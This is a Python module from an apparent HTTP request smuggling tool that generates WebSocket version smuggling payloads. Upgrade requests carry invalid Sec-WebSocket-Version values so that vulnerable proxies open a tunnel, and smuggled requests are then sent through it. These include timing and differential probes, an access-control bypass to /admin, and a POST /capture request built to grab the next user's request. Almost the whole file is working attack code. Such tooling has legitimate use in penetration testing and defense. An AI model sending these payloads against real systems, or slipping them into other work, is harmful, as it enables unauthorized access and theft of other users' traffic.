"""WebSocket Version Smuggling payload generator.

In WebSocket version smuggling (WS.Version):
- Attacker sends WebSocket upgrade with invalid Sec-WebSocket-Version
- Server responds with 426 Upgrade Required
- Vulnerable proxies (Varnish, old HAProxy, Envoy) ignore the 426
- Proxy thinks tunnel is established, passes through raw data
- Attacker's subsequent data is sent directly to backend

This allows bypassing proxy-level restrictions and accessing
internal services through the "tunnel."
"""

from typing import List, Tuple
from urllib.parse import urlparse
import base64
import os

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)


class WebSocketVersionPayloadGenerator(PayloadGenerator):
    """Generator for WebSocket version smuggling payloads.
    
    These payloads exploit proxy tunnel behavior when WebSocket
    upgrade fails with invalid version numbers.
    """
    
    # Invalid versions that trigger 426 but may confuse proxies
    INVALID_VERSIONS = [
        1337,       # Obviously invalid
        9999,       # High invalid value
        0,          # Zero
        -1,         # Negative (interpreted as large unsigned)
        256,        # Just above valid range
        65535,      # Max uint16
        999999,     # Very large
        7,          # Just below minimum valid (8)
        14,         # Just above maximum valid (13)
    ]
    
    # Common WebSocket paths to test
    WEBSOCKET_PATHS = [
        "/socket.io/",
        "/ws",
        "/websocket",
        "/graphql-ws",
        "/subscriptions",
        "/sockjs/",
        "/cable",
        "/realtime",
        "/api/ws",
        "/live",
    ]
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.WS_VERSION
    
    @property
    def name(self) -> str:
        return "WebSocket Version Smuggling Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract host and path from endpoint."""
        parsed = urlparse(endpoint.url)
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            host = f"{host}:{parsed.port}"
        path = parsed.path or "/"
        return host, path
    
    def _generate_ws_key(self) -> str:
        """Generate a random WebSocket key."""
        return base64.b64encode(os.urandom(16)).decode()
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate WebSocket version smuggling timing payloads.
        
        These detect if the proxy creates a tunnel despite 426 response.
        """
        host, _ = self._extract_host_path(endpoint)
        payloads = []
        
        # For each WebSocket path and invalid version
        for ws_path in self.WEBSOCKET_PATHS[:3]:  # Limit paths for timing
            for version in self.INVALID_VERSIONS[:3]:  # Limit versions for timing
                ws_key = self._generate_ws_key()
                
                # WebSocket upgrade request with invalid version
                # Followed by HTTP request that should timeout if tunnel works
                payload = (
                    f"GET {ws_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {ws_key}\r\n"
                    f"Sec-WebSocket-Version: {version}\r\n"
                    f"Origin: https://{host}\r\n"
                    f"\r\n"
                    # If tunnel is established, this becomes raw TCP data
                    # Backend may wait for HTTP request completion
                    f"INVALID_HTTP"
                )
                
                payloads.append(Payload(
                    name=f"WS.Version-timing-v{version}",
                    variant=self.variant,
                    category=PayloadCategory.TIMING,
                    raw_request=payload.encode(),
                    description=f"WebSocket upgrade with version {version}",
                    detection_method=DetectionMethod.TIMING,
                    expected_behavior="Proxy tunnel causes timeout on invalid follow-up",
                    expected_timeout=5.0,
                    metadata={
                        "ws_path": ws_path,
                        "ws_version": version,
                        "ws_key": ws_key,
                    },
                ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate WebSocket version smuggling differential payloads.
        
        These send a valid HTTP request through the "tunnel" to detect
        if the proxy incorrectly established a connection.
        """
        host, _ = self._extract_host_path(endpoint)
        payloads = []
        
        for ws_path in self.WEBSOCKET_PATHS:
            for version in self.INVALID_VERSIONS[:4]:
                ws_key = self._generate_ws_key()
                
                # Smuggled request that goes through the tunnel
                smuggled = (
                    f"GET /ws_smuggled HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                )
                
                # Two-part payload: upgrade + smuggled request
                payload = (
                    f"GET {ws_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {ws_key}\r\n"
                    f"Sec-WebSocket-Version: {version}\r\n"
                    f"Origin: https://{host}\r\n"
                    f"\r\n"
                    f"{smuggled}"
                )
                
                payloads.append(Payload(
                    name=f"WS.Version-diff-{ws_path.strip('/').replace('/', '_')}-v{version}",
                    variant=self.variant,
                    category=PayloadCategory.DIFFERENTIAL,
                    raw_request=payload.encode(),
                    description=f"WebSocket smuggle via {ws_path} version {version}",
                    detection_method=DetectionMethod.DIFFERENTIAL,
                    expected_behavior="Smuggled request processed by backend",
                    poison_prefix="GET /ws_smuggled",
                    metadata={
                        "ws_path": ws_path,
                        "ws_version": version,
                        "ws_key": ws_key,
                        "smuggled_request": smuggled,
                    },
                ))
        
        # Smuggle to /admin via WebSocket tunnel
        for ws_path in self.WEBSOCKET_PATHS[:3]:
            ws_key = self._generate_ws_key()
            
            admin_request = (
                f"GET /admin HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"X-Via-WS: true\r\n"
                f"\r\n"
            )
            
            payload = (
                f"GET {ws_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 1337\r\n"
                f"\r\n"
                f"{admin_request}"
            )
            
            payloads.append(Payload(
                name=f"WS.Version-admin-{ws_path.strip('/').replace('/', '_')}",
                variant=self.variant,
                category=PayloadCategory.DIFFERENTIAL,
                raw_request=payload.encode(),
                description=f"WebSocket tunnel to /admin via {ws_path}",
                detection_method=DetectionMethod.DIFFERENTIAL,
                expected_behavior="Access /admin through WebSocket tunnel",
                poison_prefix="GET /admin",
                metadata={
                    "ws_path": ws_path,
                    "ws_version": 1337,
                    "attack_type": "acl_bypass",
                },
            ))
        
        # POST request smuggling for request capture
        for ws_path in self.WEBSOCKET_PATHS[:2]:
            ws_key = self._generate_ws_key()
            
            capture_request = (
                f"POST /capture HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 500\r\n"
                f"\r\n"
                f"captured="
            )
            
            payload = (
                f"GET {ws_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 9999\r\n"
                f"\r\n"
                f"{capture_request}"
            )
            
            payloads.append(Payload(
                name=f"WS.Version-capture-{ws_path.strip('/').replace('/', '_')}",
                variant=self.variant,
                category=PayloadCategory.DIFFERENTIAL,
                raw_request=payload.encode(),
                description=f"WebSocket tunnel request capture via {ws_path}",
                detection_method=DetectionMethod.DIFFERENTIAL,
                expected_behavior="Capture next request through tunnel",
                poison_prefix="POST /capture",
                metadata={
                    "ws_path": ws_path,
                    "capture_length": 500,
                },
            ))
        
        return payloads
    
    def generate_for_path(
        self,
        endpoint: Endpoint,
        ws_path: str,
        versions: List[int] = None,
    ) -> List[Payload]:
        """Generate payloads for a specific WebSocket path.
        
        Args:
            endpoint: Target endpoint
            ws_path: WebSocket path to target
            versions: List of versions to try (default: all)
        
        Returns:
            List of payloads for that path
        """
        host, _ = self._extract_host_path(endpoint)
        versions = versions or self.INVALID_VERSIONS
        payloads = []
        
        for version in versions:
            ws_key = self._generate_ws_key()
            
            smuggled = f"GET /ws_test HTTP/1.1\r\nHost: {host}\r\n\r\n"
            
            payload = (
                f"GET {ws_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: {version}\r\n"
                f"\r\n"
                f"{smuggled}"
            )
            
            payloads.append(Payload(
                name=f"WS.Version-custom-v{version}",
                variant=self.variant,
                category=PayloadCategory.DIFFERENTIAL,
                raw_request=payload.encode(),
                description=f"Custom WS path {ws_path} version {version}",
                detection_method=DetectionMethod.DIFFERENTIAL,
                expected_behavior="Smuggled request through tunnel",
                poison_prefix="GET /ws_test",
                metadata={
                    "ws_path": ws_path,
                    "ws_version": version,
                },
            ))
        
        return payloads

